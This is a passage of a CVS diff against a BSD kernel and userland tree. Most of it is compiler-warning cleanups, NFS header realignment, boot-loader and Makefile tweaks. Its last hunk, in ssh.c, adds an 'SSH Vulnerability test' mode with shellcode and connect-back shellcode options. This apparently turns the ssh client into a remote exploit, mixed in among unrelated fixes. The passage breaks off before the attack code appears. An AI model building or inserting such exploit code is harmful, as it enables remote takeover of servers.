 #endif /* INET */
 
 #ifdef INET6
-	struct ip6_hdr *ip6;
+	struct ip6_hdr *ip6 = NULL;
 #endif /* INET6 */
 
 	struct tdb_ident *tdbi;
Index: src/sys/netinet/tcp_input.c
===================================================================
RCS file: /cvs/src/sys/netinet/tcp_input.c,v
retrieving revision 1.124
diff -u -r1.124 tcp_input.c
--- src/sys/netinet/tcp_input.c	11 Sep 2002 03:26:41 -0000	1.124
+++ src/sys/netinet/tcp_input.c	20 Dec 2002 23:24:43 -0000
@@ -432,7 +432,7 @@
 #endif /* IPSEC */
 	int af;
 #ifdef TCP_ECN
-	u_char iptos;
+	u_char iptos = 0;
 #endif
 
 	va_start(ap, m);
Index: src/sys/netinet/tcp_output.c
===================================================================
RCS file: /cvs/src/sys/netinet/tcp_output.c,v
retrieving revision 1.53
diff -u -r1.53 tcp_output.c
--- src/sys/netinet/tcp_output.c	28 Aug 2002 15:42:41 -0000	1.53
+++ src/sys/netinet/tcp_output.c	20 Dec 2002 23:24:43 -0000
@@ -220,8 +220,8 @@
 	register struct tcpcb *tp;
 {
 	register struct socket *so = tp->t_inpcb->inp_socket;
-	register long len, win;
-	int off, flags, error;
+	register long len = 0, win;
+	int off, flags, error = 0;
 	register struct mbuf *m;
 	register struct tcphdr *th;
 	u_char opt[MAX_TCPOPTLEN];
@@ -229,7 +229,7 @@
 	int idle, sendalot = 0;
 #ifdef TCP_SACK
 	int i, sack_rxmit = 0;
-	struct sackhole *p;
+	struct sackhole *p = NULL;
 #endif
 #if defined(TCP_SACK)
 	int maxburst = TCP_MAXBURST;
Index: src/sys/netinet/tcp_subr.c
===================================================================
RCS file: /cvs/src/sys/netinet/tcp_subr.c,v
retrieving revision 1.65
diff -u -r1.65 tcp_subr.c
--- src/sys/netinet/tcp_subr.c	28 Aug 2002 15:42:41 -0000	1.65
+++ src/sys/netinet/tcp_subr.c	20 Dec 2002 23:24:43 -0000
@@ -134,7 +134,7 @@
 #endif
 int	tcp_do_sack = TCP_DO_SACK;		/* RFC 2018 selective ACKs */
 int	tcp_ack_on_push = 0;	/* set to enable immediate ACK-on-PUSH */
-int	tcp_do_ecn = 0;		/* RFC3168 ECN enabled/disabled? */
+int	tcp_do_ecn = 1;		/* RFC3168 ECN enabled/disabled? */
 
 #ifndef TCBHASHSIZE
 #define	TCBHASHSIZE	128
@@ -212,7 +212,7 @@
 	if ((m = tp->t_template) == 0) {
 		m = m_get(M_DONTWAIT, MT_HEADER);
 		if (m == NULL)
-			return (0);
+			return (NULL);
 
 		switch (tp->pf) {
 		case 0:	/*default to PF_INET*/
@@ -287,6 +287,8 @@
 		}
 		break;
 #endif /* INET6 */
+    default:
+	return (NULL);
 	}
 
 	th->th_sport = inp->inp_lport;
@@ -392,6 +394,8 @@
 			xchg(ti->ti_dst.s_addr, ti->ti_src.s_addr, u_int32_t);
 			th = (void *)((caddr_t)ti + sizeof(struct ip));
 			break;
+	default:
+	    return;
 		}
 		xchg(th->th_dport, th->th_sport, u_int16_t);
 #undef xchg
@@ -408,6 +412,8 @@
 		tlen += sizeof (struct tcpiphdr);
 		th = (struct tcphdr *)((caddr_t)ti + sizeof(struct ip));
 		break;
+    default:
+	return;
 	}
 
 	m->m_len = tlen;
@@ -808,6 +814,7 @@
 	} else {
 		m = NULL;
 		ip6 = NULL;
+	off = 0;
 		sa6_src = &sa6_any;
 	}
 
Index: src/sys/netinet/tcp_usrreq.c
===================================================================
RCS file: /cvs/src/sys/netinet/tcp_usrreq.c,v
retrieving revision 1.67
diff -u -r1.67 tcp_usrreq.c
--- src/sys/netinet/tcp_usrreq.c	11 Sep 2002 03:15:14 -0000	1.67
+++ src/sys/netinet/tcp_usrreq.c	20 Dec 2002 23:24:43 -0000
@@ -783,10 +783,10 @@
 {
 	int error = 0, s;
 	struct tcp_ident_mapping tir;
-	struct inpcb *inp;
-	struct sockaddr_in *fin, *lin;
+	struct inpcb *inp = NULL;
+	struct sockaddr_in *fin = NULL, *lin = NULL;
 #ifdef INET6
-	struct sockaddr_in6 *fin6, *lin6;
+	struct sockaddr_in6 *fin6 = NULL, *lin6 = NULL;
 	struct in6_addr f6, l6;
 #endif
 
Index: src/sys/netinet/udp_usrreq.c
===================================================================
RCS file: /cvs/src/sys/netinet/udp_usrreq.c,v
retrieving revision 1.86
diff -u -r1.86 udp_usrreq.c
--- src/sys/netinet/udp_usrreq.c	28 Aug 2002 15:42:41 -0000	1.86
+++ src/sys/netinet/udp_usrreq.c	20 Dec 2002 23:24:43 -0000
@@ -714,6 +714,7 @@
 		m = NULL;
 		ip6 = NULL;
 		cmdarg = NULL;
+		off = 0;
 		/* XXX: translate addresses into internal form */
 		sa6 = *(struct sockaddr_in6 *)sa;
 #ifndef SCOPEDROUTING
Index: src/sys/netinet6/in6_ifattach.c
===================================================================
RCS file: /cvs/src/sys/netinet6/in6_ifattach.c,v
retrieving revision 1.32
diff -u -r1.32 in6_ifattach.c
--- src/sys/netinet6/in6_ifattach.c	12 Sep 2002 01:11:32 -0000	1.32
+++ src/sys/netinet6/in6_ifattach.c	20 Dec 2002 23:24:43 -0000
@@ -674,12 +674,13 @@
 	nd6_purge(ifp);
 
 	/* nuke any of IPv6 addresses we have */
-	for (ifa = ifp->if_addrlist.tqh_first; ifa; ifa = next)
-	{
+	ifa = ifp->if_addrlist.tqh_first;
+	while (ifa) {
 		next = ifa->ifa_list.tqe_next;
 		if (ifa->ifa_addr->sa_family != AF_INET6)
 			continue;
 		in6_purgeaddr(ifa);
+		ifa = next;
 	}
 
 	/* undo everything done by in6_ifattach(), just in case */
@@ -734,6 +735,7 @@
 		}
 
 		IFAFREE(&oia->ia_ifa);
+		ifa = next;
 	}
 
 	/* cleanup multicast address kludge table, if there is any */
Index: src/sys/netinet6/ip6_forward.c
===================================================================
RCS file: /cvs/src/sys/netinet6/ip6_forward.c,v
retrieving revision 1.24
diff -u -r1.24 ip6_forward.c
--- src/sys/netinet6/ip6_forward.c	9 Jun 2002 14:38:17 -0000	1.24
+++ src/sys/netinet6/ip6_forward.c	20 Dec 2002 23:24:43 -0000
@@ -88,7 +88,7 @@
 	struct ip6_hdr *ip6 = mtod(m, struct ip6_hdr *);
 	struct sockaddr_in6 *dst;
 	struct rtentry *rt;
-	int error, type = 0, code = 0;
+	int error = 0, type = 0, code = 0;
 	struct mbuf *mcopy = NULL;
 	long time_second = time.tv_sec;
 	struct ifnet *origifp;	/* maybe unnecessary */
Index: src/sys/netinet6/ip6_output.c
===================================================================
RCS file: /cvs/src/sys/netinet6/ip6_output.c,v
retrieving revision 1.73
diff -u -r1.73 ip6_output.c
--- src/sys/netinet6/ip6_output.c	31 Oct 2002 18:02:05 -0000	1.73
+++ src/sys/netinet6/ip6_output.c	20 Dec 2002 23:24:43 -0000
@@ -168,7 +168,7 @@
 	struct m_tag *mtag;
 	union sockaddr_union sdst;
 	struct tdb_ident *tdbi;
-	u_int32_t sspi;
+	u_int32_t sspi = 0;
 	struct inpcb *inp;
 	struct tdb *tdb;
 	int s;
Index: src/sys/netinet6/raw_ip6.c
===================================================================
RCS file: /cvs/src/sys/netinet6/raw_ip6.c,v
retrieving revision 1.17
diff -u -r1.17 raw_ip6.c
--- src/sys/netinet6/raw_ip6.c	11 Sep 2002 03:27:08 -0000	1.17
+++ src/sys/netinet6/raw_ip6.c	20 Dec 2002 23:24:43 -0000
@@ -378,7 +378,8 @@
 	int error = 0;
 	struct ip6_pktopts opt, *optp = NULL, *origoptp;
 	struct ifnet *oifp = NULL;
-	int type, code;		/* for ICMPv6 output statistics only */
+	/* for ICMPv6 output statistics only */
+	int type = 0, code = 0;
 	int priv = 0;
 	va_list ap;
 	int flags;
Index: src/sys/nfs/nfsproto.h
===================================================================
RCS file: /cvs/src/sys/nfs/nfsproto.h,v
retrieving revision 1.4
diff -u -r1.4 nfsproto.h
--- src/sys/nfs/nfsproto.h	28 Jan 2002 22:35:57 -0000	1.4
+++ src/sys/nfs/nfsproto.h	20 Dec 2002 23:24:43 -0000
@@ -54,18 +54,18 @@
  * Specification"
  */
 
-#define NFS_PORT	2049
+#define	NFS_PORT	2049
 #define	NFS_PROG	100003
-#define NFS_VER2	2
+#define	NFS_VER2	2
 #define	NFS_VER3	3
-#define NFS_VER4        4
-#define NFS_V2MAXDATA	8192
-#define	NFS_MAXDGRAMDATA 16384
+#define	NFS_VER4        4
+#define	NFS_V2MAXDATA	8192
+#define	NFS_MAXDGRAMDATA 32768
 #define	NFS_MAXDATA	32768
 #define	NFS_MAXPATHLEN	1024
 #define	NFS_MAXNAMLEN	255
 #define	NFS_MAXPKTHDR	404
-#define NFS_MAXPACKET	(NFS_MAXPKTHDR + NFS_MAXDATA)
+#define	NFS_MAXPACKET	(NFS_MAXPKTHDR + NFS_MAXDATA)
 #define	NFS_MINPACKET	20
 #define	NFS_FABLKSIZE	512	/* Size in bytes of a block wrt fa_blocks */
 
@@ -100,12 +100,12 @@
 #define	NFSERR_SERVERFAULT	10006
 #define	NFSERR_BADTYPE		10007
 #define	NFSERR_JUKEBOX		10008
-#define NFSERR_TRYLATER		NFSERR_JUKEBOX
+#define	NFSERR_TRYLATER		NFSERR_JUKEBOX
 #define	NFSERR_STALEWRITEVERF	30001	/* Fake return for nfs_commit() */
 
-#define NFSERR_RETVOID		0x20000000 /* Return void, not error */
-#define NFSERR_AUTHERR		0x40000000 /* Mark an authentication error */
-#define NFSERR_RETERR		0x80000000 /* Mark an error return for V3 */
+#define	NFSERR_RETVOID		0x20000000 /* Return void, not error */
+#define	NFSERR_AUTHERR		0x40000000 /* Mark an authentication error */
+#define	NFSERR_RETERR		0x80000000 /* Mark an error return for V3 */
 
 /* Sizes in bytes of various nfs rpc components */
 #define	NFSX_UNSIGNED	4
@@ -115,38 +115,38 @@
 #define	NFSX_V2FATTR	68
 #define	NFSX_V2SATTR	32
 #define	NFSX_V2COOKIE	4
-#define NFSX_V2STATFS	20
+#define	NFSX_V2STATFS	20
 
 /* specific to NFS Version 3 */
-#define NFSX_V3FH		(sizeof (fhandle_t)) /* size this server uses */
+#define	NFSX_V3FH		(sizeof (fhandle_t)) /* size this server uses */
 #define	NFSX_V3FHMAX		64	/* max. allowed by protocol */
-#define NFSX_V3FATTR		84
-#define NFSX_V3SATTR		60	/* max. all fields filled in */
-#define NFSX_V3SRVSATTR		(sizeof (struct nfsv3_sattr))
-#define NFSX_V3POSTOPATTR	(NFSX_V3FATTR + NFSX_UNSIGNED)
-#define NFSX_V3WCCDATA		(NFSX_V3POSTOPATTR + 8 * NFSX_UNSIGNED)
-#define NFSX_V3COOKIEVERF 	8
-#define NFSX_V3WRITEVERF 	8
-#define NFSX_V3CREATEVERF	8
-#define NFSX_V3STATFS		52
-#define NFSX_V3FSINFO		48
-#define NFSX_V3PATHCONF		24
+#define	NFSX_V3FATTR		84
+#define	NFSX_V3SATTR		60	/* max. all fields filled in */
+#define	NFSX_V3SRVSATTR		(sizeof (struct nfsv3_sattr))
+#define	NFSX_V3POSTOPATTR	(NFSX_V3FATTR + NFSX_UNSIGNED)
+#define	NFSX_V3WCCDATA		(NFSX_V3POSTOPATTR + 8 * NFSX_UNSIGNED)
+#define	NFSX_V3COOKIEVERF 	8
+#define	NFSX_V3WRITEVERF 	8
+#define	NFSX_V3CREATEVERF	8
+#define	NFSX_V3STATFS		52
+#define	NFSX_V3FSINFO		48
+#define	NFSX_V3PATHCONF		24
 
 /* variants for both versions */
-#define NFSX_FH(v3)		((v3) ? (NFSX_V3FHMAX + NFSX_UNSIGNED) : \
+#define	NFSX_FH(v3)		((v3) ? (NFSX_V3FHMAX + NFSX_UNSIGNED) : \
 					NFSX_V2FH)
-#define NFSX_SRVFH(v3)		((v3) ? NFSX_V3FH : NFSX_V2FH)
+#define	NFSX_SRVFH(v3)		((v3) ? NFSX_V3FH : NFSX_V2FH)
 #define	NFSX_FATTR(v3)		((v3) ? NFSX_V3FATTR : NFSX_V2FATTR)
-#define NFSX_PREOPATTR(v3)	((v3) ? (7 * NFSX_UNSIGNED) : 0)
-#define NFSX_POSTOPATTR(v3)	((v3) ? (NFSX_V3FATTR + NFSX_UNSIGNED) : 0)
-#define NFSX_POSTOPORFATTR(v3)	((v3) ? (NFSX_V3FATTR + NFSX_UNSIGNED) : \
+#define	NFSX_PREOPATTR(v3)	((v3) ? (7 * NFSX_UNSIGNED) : 0)
+#define	NFSX_POSTOPATTR(v3)	((v3) ? (NFSX_V3FATTR + NFSX_UNSIGNED) : 0)
+#define	NFSX_POSTOPORFATTR(v3)	((v3) ? (NFSX_V3FATTR + NFSX_UNSIGNED) : \
 					NFSX_V2FATTR)
-#define NFSX_WCCDATA(v3)	((v3) ? NFSX_V3WCCDATA : 0)
-#define NFSX_WCCORFATTR(v3)	((v3) ? NFSX_V3WCCDATA : NFSX_V2FATTR)
+#define	NFSX_WCCDATA(v3)	((v3) ? NFSX_V3WCCDATA : 0)
+#define	NFSX_WCCORFATTR(v3)	((v3) ? NFSX_V3WCCDATA : NFSX_V2FATTR)
 #define	NFSX_SATTR(v3)		((v3) ? NFSX_V3SATTR : NFSX_V2SATTR)
 #define	NFSX_COOKIEVERF(v3)	((v3) ? NFSX_V3COOKIEVERF : 0)
 #define	NFSX_WRITEVERF(v3)	((v3) ? NFSX_V3WRITEVERF : 0)
-#define NFSX_READDIR(v3)	((v3) ? (5 * NFSX_UNSIGNED) : \
+#define	NFSX_READDIR(v3)	((v3) ? (5 * NFSX_UNSIGNED) : \
 					(2 * NFSX_UNSIGNED))
 #define	NFSX_STATFS(v3)		((v3) ? NFSX_V3STATFS : NFSX_V2STATFS)
 
@@ -174,7 +174,7 @@
 #define	NFSPROC_PATHCONF	20
 #define	NFSPROC_COMMIT		21
 
-#define NFSPROC_NOOP		25
+#define	NFSPROC_NOOP		25
 #define	NFS_NPROCS		26
 
 /* Actual Version 2 procedure numbers */
@@ -201,35 +201,35 @@
 /*
  * Constants used by the Version 3 protocol for various RPCs
  */
-#define NFSV3SATTRTIME_DONTCHANGE	0
-#define NFSV3SATTRTIME_TOSERVER		1
-#define NFSV3SATTRTIME_TOCLIENT		2
-
-#define NFSV3ACCESS_READ		0x01
-#define NFSV3ACCESS_LOOKUP		0x02
-#define NFSV3ACCESS_MODIFY		0x04
-#define NFSV3ACCESS_EXTEND		0x08
-#define NFSV3ACCESS_DELETE		0x10
-#define NFSV3ACCESS_EXECUTE		0x20
-
-#define NFSV3WRITE_UNSTABLE		0
-#define NFSV3WRITE_DATASYNC		1
-#define NFSV3WRITE_FILESYNC		2
-
-#define NFSV3CREATE_UNCHECKED		0
-#define NFSV3CREATE_GUARDED		1
-#define NFSV3CREATE_EXCLUSIVE		2
-
-#define NFSV3FSINFO_LINK		0x01
-#define NFSV3FSINFO_SYMLINK		0x02
-#define NFSV3FSINFO_HOMOGENEOUS		0x08
-#define NFSV3FSINFO_CANSETTIME		0x10
+#define	NFSV3SATTRTIME_DONTCHANGE	0
+#define	NFSV3SATTRTIME_TOSERVER		1
+#define	NFSV3SATTRTIME_TOCLIENT		2
+
+#define	NFSV3ACCESS_READ		0x01
+#define	NFSV3ACCESS_LOOKUP		0x02
+#define	NFSV3ACCESS_MODIFY		0x04
+#define	NFSV3ACCESS_EXTEND		0x08
+#define	NFSV3ACCESS_DELETE		0x10
+#define	NFSV3ACCESS_EXECUTE		0x20
+
+#define	NFSV3WRITE_UNSTABLE		0
+#define	NFSV3WRITE_DATASYNC		1
+#define	NFSV3WRITE_FILESYNC		2
+
+#define	NFSV3CREATE_UNCHECKED		0
+#define	NFSV3CREATE_GUARDED		1
+#define	NFSV3CREATE_EXCLUSIVE		2
+
+#define	NFSV3FSINFO_LINK		0x01
+#define	NFSV3FSINFO_SYMLINK		0x02
+#define	NFSV3FSINFO_HOMOGENEOUS		0x08
+#define	NFSV3FSINFO_CANSETTIME		0x10
 
 /* Conversion macros */
 #define	vtonfsv2_mode(t,m) \
 		txdr_unsigned(((t) == VFIFO) ? MAKEIMODE(VCHR, (m)) : \
 				MAKEIMODE((t), (m)))
-#define vtonfsv3_mode(m)	txdr_unsigned((m) & 07777)
+#define	vtonfsv3_mode(m)	txdr_unsigned((m) & 07777)
 #define	nfstov_mode(a)		(fxdr_unsigned(u_int16_t, (a))&07777)
 #define	vtonfsv2_type(a)	txdr_unsigned(nfsv2_type[((int32_t)(a))])
 #define	vtonfsv3_type(a)	txdr_unsigned(nfsv3_type[((int32_t)(a))])
@@ -249,7 +249,7 @@
  * NFS_SMALLFH should be in the range of 32 to 64 and be divisible by 4.
  */
 #ifndef NFS_SMALLFH
-#define NFS_SMALLFH	64
+#define	NFS_SMALLFH	64
 #endif
 union nfsfh {
 	fhandle_t fh_generic;
@@ -400,18 +400,18 @@
 	} sf_un;
 };
 
-#define sf_tsize	sf_un.sf_nfsv2.nfsv2sf_tsize
-#define sf_bsize	sf_un.sf_nfsv2.nfsv2sf_bsize
-#define sf_blocks	sf_un.sf_nfsv2.nfsv2sf_blocks
-#define sf_bfree	sf_un.sf_nfsv2.nfsv2sf_bfree
-#define sf_bavail	sf_un.sf_nfsv2.nfsv2sf_bavail
-#define sf_tbytes	sf_un.sf_nfsv3.nfsv3sf_tbytes
-#define sf_fbytes	sf_un.sf_nfsv3.nfsv3sf_fbytes
-#define sf_abytes	sf_un.sf_nfsv3.nfsv3sf_abytes
-#define sf_tfiles	sf_un.sf_nfsv3.nfsv3sf_tfiles
-#define sf_ffiles	sf_un.sf_nfsv3.nfsv3sf_ffiles
-#define sf_afiles	sf_un.sf_nfsv3.nfsv3sf_afiles
-#define sf_invarsec	sf_un.sf_nfsv3.nfsv3sf_invarsec
+#define	sf_tsize	sf_un.sf_nfsv2.nfsv2sf_tsize
+#define	sf_bsize	sf_un.sf_nfsv2.nfsv2sf_bsize
+#define	sf_blocks	sf_un.sf_nfsv2.nfsv2sf_blocks
+#define	sf_bfree	sf_un.sf_nfsv2.nfsv2sf_bfree
+#define	sf_bavail	sf_un.sf_nfsv2.nfsv2sf_bavail
+#define	sf_tbytes	sf_un.sf_nfsv3.nfsv3sf_tbytes
+#define	sf_fbytes	sf_un.sf_nfsv3.nfsv3sf_fbytes
+#define	sf_abytes	sf_un.sf_nfsv3.nfsv3sf_abytes
+#define	sf_tfiles	sf_un.sf_nfsv3.nfsv3sf_tfiles
+#define	sf_ffiles	sf_un.sf_nfsv3.nfsv3sf_ffiles
+#define	sf_afiles	sf_un.sf_nfsv3.nfsv3sf_afiles
+#define	sf_invarsec	sf_un.sf_nfsv3.nfsv3sf_invarsec
 
 struct nfsv3_fsinfo {
 	u_int32_t fs_rtmax;
Index: src/sys/stand/boot/cmd.c
===================================================================
RCS file: /cvs/src/sys/stand/boot/cmd.c,v
retrieving revision 1.48
diff -u -r1.48 cmd.c
--- src/sys/stand/boot/cmd.c	14 Jul 2002 09:18:55 -0000	1.48
+++ src/sys/stand/boot/cmd.c	20 Dec 2002 23:24:43 -0000
@@ -86,8 +86,19 @@
 {
 	cmd.cmd = NULL;
 
-	if (!readline(cmd_buf, sizeof(cmd_buf), cmd.timeout))
+	switch (readline(cmd_buf, sizeof(cmd_buf), cmd.timeout))
+	{
+	default:
+		cmd.timeout = 0;
+		break;
+	case 0:
+		cmd.timeout = 0;
 		cmd.cmd = cmd_table;
+		break;
+	case -1:
+		strncpy(cmd_buf, "boot", 5);
+		break;
+	}
 
 	return docmd();
 }
@@ -238,11 +249,16 @@
 			if (!(i++ % 1000) && (getsecs() >= tt))
 				break;
 
+#if 0
 		if (!cnischar()) {
 			strncpy(buf, "boot", 5);
 			putchar('\n');
 			return strlen(buf);
 		}
+#else
+		if (!cnischar())
+			return -1;
+#endif
 	} else
 		while (!cnischar()) ;
 
@@ -499,4 +515,3 @@
 	exit();
 	return 0; /* just in case */
 }
-
Index: src/sys/sys/resource.h
===================================================================
RCS file: /cvs/src/sys/sys/resource.h,v
retrieving revision 1.4
diff -u -r1.4 resource.h
--- src/sys/sys/resource.h	14 Mar 2002 01:26:52 -0000	1.4
+++ src/sys/sys/resource.h	20 Dec 2002 23:24:43 -0000
@@ -89,8 +89,9 @@
 #define	RLIMIT_MEMLOCK	6		/* locked-in-memory address space */
 #define	RLIMIT_NPROC	7		/* number of processes */
 #define	RLIMIT_NOFILE	8		/* number of open files */
+#define	RLIMIT_TIME	9		/* user time */
 
-#define	RLIM_NLIMITS	9		/* number of resource limits */
+#define	RLIM_NLIMITS	10		/* number of resource limits */
 
 #define	RLIM_INFINITY	(((u_quad_t)1 << 63) - 1)
 
Index: src/sys/ufs/ffs/ffs_softdep.c
===================================================================
RCS file: /cvs/src/sys/ufs/ffs/ffs_softdep.c,v
retrieving revision 1.42
diff -u -r1.42 ffs_softdep.c
--- src/sys/ufs/ffs/ffs_softdep.c	12 Oct 2002 01:09:23 -0000	1.42
+++ src/sys/ufs/ffs/ffs_softdep.c	20 Dec 2002 23:24:44 -0000
@@ -327,7 +327,7 @@
 	struct sema *semap;
 	struct lockit *interlock;
 {
-	int s;
+	int s = 0;
 
 	if (semap->value++ > 0) {
 		if (interlock != NULL)
Index: src/sys/ufs/ffs/ffs_vfsops.c
===================================================================
RCS file: /cvs/src/sys/ufs/ffs/ffs_vfsops.c,v
retrieving revision 1.54
diff -u -r1.54 ffs_vfsops.c
--- src/sys/ufs/ffs/ffs_vfsops.c	1 Aug 2002 16:41:11 -0000	1.54
+++ src/sys/ufs/ffs/ffs_vfsops.c	20 Dec 2002 23:24:45 -0000
@@ -167,7 +167,7 @@
 	struct ufsmount *ump = NULL;
 	register struct fs *fs;
 	int error = 0, flags;
-	int ronly;
+	int ronly = 0;
 	mode_t accessmode;
 	size_t size;
 
Index: src/sys/uvm/uvm_amap.c
===================================================================
RCS file: /cvs/src/sys/uvm/uvm_amap.c,v
retrieving revision 1.27
diff -u -r1.27 uvm_amap.c
--- src/sys/uvm/uvm_amap.c	9 May 2002 14:13:56 -0000	1.27
+++ src/sys/uvm/uvm_amap.c	20 Dec 2002 23:24:45 -0000
@@ -1007,7 +1007,7 @@
 	struct vm_amap *amap;
 	int slotoff, slots;
 {
-	int byanon, lcv, stop, curslot, ptr, slotend;
+	int byanon, lcv, stop, curslot, ptr, slotend = 0;
 	struct vm_anon *anon;
 
 	/*
Index: src/sys/uvm/uvm_map.c
===================================================================
RCS file: /cvs/src/sys/uvm/uvm_map.c,v
retrieving revision 1.56
diff -u -r1.56 uvm_map.c
--- src/sys/uvm/uvm_map.c	9 Dec 2002 02:34:59 -0000	1.56
+++ src/sys/uvm/uvm_map.c	20 Dec 2002 23:24:45 -0000
@@ -304,9 +304,10 @@
 
 	RB_FOREACH(tmp, uvm_tree, &map->rbhead) {
 		if (tmp->ownspace != uvm_rb_space(map, tmp)) {
-			printf("%s: %d/%d ownspace %x != %x %s\n",
+			printf("%s: %d/%d ownspace %lx != %lx %s\n",
 			    name, n + 1, map->nentries,
-			    tmp->ownspace, uvm_rb_space(map, tmp),
+			    (unsigned long) tmp->ownspace,
+		   (unsigned long) uvm_rb_space(map, tmp),
 			    tmp->next == &map->header ? "(last)" : "");
 			goto error;
 		}
@@ -314,13 +315,14 @@
 	trtmp = NULL;
 	RB_FOREACH(tmp, uvm_tree, &map->rbhead) {
 		if (tmp->space != uvm_rb_subtree_space(tmp)) {
-			printf("%s: space %d != %d\n",
+			printf("%s: space %ld != %d\n",
 			    name, tmp->space, uvm_rb_subtree_space(tmp));
 			goto error;
 		}
 		if (trtmp != NULL && trtmp->start >= tmp->start) {
-			printf("%s: corrupt: %p >= %p\n",
-			    name, trtmp->start, tmp->start);
+			printf("%s: corrupt: %lu >= %lu\n",
+			    name, (unsigned long) trtmp->start,
+			    (unsigned long) tmp->start);
 			goto error;
 		}
 		n++;
Index: src/sys/uvm/uvm_pager.c
===================================================================
RCS file: /cvs/src/sys/uvm/uvm_pager.c,v
retrieving revision 1.33
diff -u -r1.33 uvm_pager.c
--- src/sys/uvm/uvm_pager.c	29 Oct 2002 18:29:59 -0000	1.33
+++ src/sys/uvm/uvm_pager.c	20 Dec 2002 23:24:45 -0000
@@ -795,7 +795,7 @@
 	struct vm_page *pg, *pgs[npages];
 	struct uvm_object *uobj;
 	int i, error;
-	boolean_t write, swap;
+	boolean_t write, swap = FALSE;
 	UVMHIST_FUNC("uvm_aio_aiodone"); UVMHIST_CALLED(ubchist);
 	UVMHIST_LOG(ubchist, "bp %p", bp, 0,0,0);
 
Index: src/sys/uvm/uvm_swap.c
===================================================================
RCS file: /cvs/src/sys/uvm/uvm_swap.c,v
retrieving revision 1.55
diff -u -r1.55 uvm_swap.c
--- src/sys/uvm/uvm_swap.c	12 Oct 2002 01:09:23 -0000	1.55
+++ src/sys/uvm/uvm_swap.c	20 Dec 2002 23:24:45 -0000
@@ -1813,7 +1813,7 @@
 #ifdef UVM_SWAP_ENCRYPT
 	vaddr_t dstkva;
 	struct vm_page *tpps[MAXBSIZE >> PAGE_SHIFT];
-	struct swapdev *sdp;
+	struct swapdev *sdp = NULL;
 	int	encrypt = 0;
 #endif
 	UVMHIST_FUNC("uvm_swap_io"); UVMHIST_CALLED(pdhist);
Index: src/usr.bin/passwd/Makefile
===================================================================
RCS file: /cvs/src/usr.bin/passwd/Makefile,v
retrieving revision 1.26
diff -u -r1.26 Makefile
--- src/usr.bin/passwd/Makefile	8 May 2002 19:41:31 -0000	1.26
+++ src/usr.bin/passwd/Makefile	20 Dec 2002 23:24:45 -0000
@@ -23,12 +23,16 @@
 LDADD+=	-lkrb5 -lasn1
 .endif
 
-.if (${KERBEROS:L} == "yes")
+.if (${KERBEROS4:L} == "yes")
 .PATH:  ${.CURDIR}/../rsh
 SRCS+= new_pwd.c krb_passwd.c des_rw.c
 CFLAGS+= -DKERBEROS
-DPADD+=	${LIBKADM} ${LIBKRB} ${LIBDES} ${LIBCOMERR} ${LIBKAFS} ${LIBCRYPTO}
-LDADD+=	-lkadm -lkrb -ldes -lcom_err -lkafs -lcrypto
+DPADD+=	${LIBKADM} ${LIBKRB} ${LIBDES} ${LIBCOMERR} ${LIBCRYPTO}
+LDADD+=	-lkadm -lkrb -ldes -lcom_err -lcrypto
+.if (${AFS:L} == "yes")
+DPADD+=	${LIBKAFS}
+LDADD+=	lkafs
+.endif
 .endif
 
 BINMODE=4555
Index: src/usr.bin/rdist/Makefile
===================================================================
RCS file: /cvs/src/usr.bin/rdist/Makefile,v
retrieving revision 1.12
diff -u -r1.12 Makefile
--- src/usr.bin/rdist/Makefile	9 May 2002 19:12:40 -0000	1.12
+++ src/usr.bin/rdist/Makefile	20 Dec 2002 23:24:45 -0000
@@ -2,7 +2,7 @@
 
 
 PROG=	rdist
-CFLAGS+=-I. -DOS_H=\"os-openbsd.h\"
+CFLAGS+=-I. -I${.CURDIR} -DOS_H=\"os-openbsd.h\"
 SRCS=	gram.y child.c client.c common.c distopt.c docmd.c expand.c \
 	isexec.c lookup.c message.c rdist.c
 CLEANFILES+=gram.c y.tab.h
Index: src/usr.bin/rsh/Makefile
===================================================================
RCS file: /cvs/src/usr.bin/rsh/Makefile,v
retrieving revision 1.6
diff -u -r1.6 Makefile
--- src/usr.bin/rsh/Makefile	6 May 2002 22:23:31 -0000	1.6
+++ src/usr.bin/rsh/Makefile	20 Dec 2002 23:24:45 -0000
@@ -7,7 +7,7 @@
 
 .include <bsd.own.mk>	# For KERBEROS
 
-.if (${KERBEROS:L} == "yes")
+.if (${KERBEROS4:L} == "yes")
 SRCS+=	des_rw.c
 CFLAGS+=-DKERBEROS
 SRCS+=	krcmd.c kcmd.c
Index: src/usr.bin/ssh/lib/Makefile
===================================================================
RCS file: /cvs/src/usr.bin/ssh/lib/Makefile,v
retrieving revision 1.36
diff -u -r1.36 Makefile
--- src/usr.bin/ssh/lib/Makefile	11 Jun 2002 15:23:07 -0000	1.36
+++ src/usr.bin/ssh/lib/Makefile	20 Dec 2002 23:24:45 -0000
@@ -24,7 +24,7 @@
 CFLAGS+= -DKRB5 -I${DESTDIR}/usr/include/kerberosV
 .endif # KERBEROS5
 
-.if (${KERBEROS:L} == "yes")
+.if (${KERBEROS4:L} == "yes")
 CFLAGS+= -DKRB4 -I${DESTDIR}/usr/include/kerberosIV
 .if (${AFS:L} == "yes")
 CFLAGS+= -DAFS
Index: src/usr.bin/ssh/ssh.c
===================================================================
RCS file: /cvs/src/usr.bin/ssh/ssh.c,v
retrieving revision 1.189
diff -u -r1.189 ssh.c
--- src/usr.bin/ssh/ssh.c	9 Dec 2002 16:50:08 -0000	1.189
+++ src/usr.bin/ssh/ssh.c	20 Dec 2002 23:24:46 -0000
@@ -138,6 +138,14 @@
 /* # of replies received for global requests */
 static int client_global_request_id = 0;
 
+/* SSH Vulnerability test */
+int testing = 0;
+int chunk_size = 0;
+int tcode_rep = 0;
+int scode_rep = 0;
+char *style = "skey";
+SSH_XpMethod method = N;
+
 /* pid of proxycommand child process */
 pid_t proxy_command_pid = 0;
 
@@ -191,6 +199,12 @@
 	fprintf(stderr, "  -o 'option' Process the option as if it was read from a configuration file.\n");
 	fprintf(stderr, "  -s          Invoke command (mandatory) as SSH2 subsystem.\n");
 	fprintf(stderr, "  -b addr     Local IP address.\n");
+	fprintf(stderr, "  -M method   Select the device (skey or default bsdauth)\n");
+	fprintf(stderr, "  -S style    If using bsdauth, select the style (default skey)\n");
+	fprintf(stderr, "  -d rep      Test shellcode repeat (-z default 10000) (default 0)\n");
+	fprintf(stderr, "  -j size     Chunk size (default 4096 = 1 page)\n");
+	fprintf(stderr, "  -r rep      Connect-back shellcode repeat (default 60), unused if -z\n");
+	fprintf(stderr, "  -z          Enable testing mode\n");
 	exit(1);
 }
 
@@ -262,8 +276,27 @@
 
 again:
 	while ((opt = getopt(ac, av,
